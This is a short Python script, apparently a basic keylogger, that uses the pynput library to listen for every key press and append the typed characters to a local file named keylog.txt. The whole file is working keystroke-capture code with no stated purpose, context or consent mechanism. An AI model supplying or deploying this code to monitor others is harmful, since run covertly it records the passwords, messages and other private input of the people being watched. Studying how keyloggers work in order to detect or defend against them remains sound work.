from pynput.keyboard import Listener

def writefile(key):
    letter = str(key).replace("'","")      

    if letter == 'Key.space':
        letter = ' '
    
    if letter == 'Key.shift':
        letter = ''
    
    if letter == 'Key.enter':
        letter = '\n'
    with open("keylog.txt","a") as f:
        f.write(letter)


with Listener(on_press=writefile) as l:
    l.join()